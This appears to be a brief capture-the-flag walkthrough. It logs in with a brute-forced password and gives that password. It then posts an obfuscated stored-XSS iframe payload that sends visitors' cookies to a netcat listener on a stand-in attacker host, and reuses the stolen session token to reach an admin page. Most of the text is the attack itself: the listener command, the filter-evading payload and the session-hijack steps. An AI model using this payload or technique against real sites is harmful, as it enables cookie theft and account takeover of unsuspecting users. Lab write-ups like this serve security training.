Username:`deliver11`
Using brute.py retirve the password.
Password:`Tokyo1010`
Login and get the user flag. 
In attacker machine run the following command:
```bash
nc -nvlp 9000
```
Comment the following payload:
`<iframe src="javasc&#114;ipt:location='//attacker_ip:9000/'+top['doc'+'ument']['coo'+'kie']">`
In terminal Your will recieve a PHPSSID. Replace your token value with that one.
Now visit http://IP/admin.php and get the admin flag.
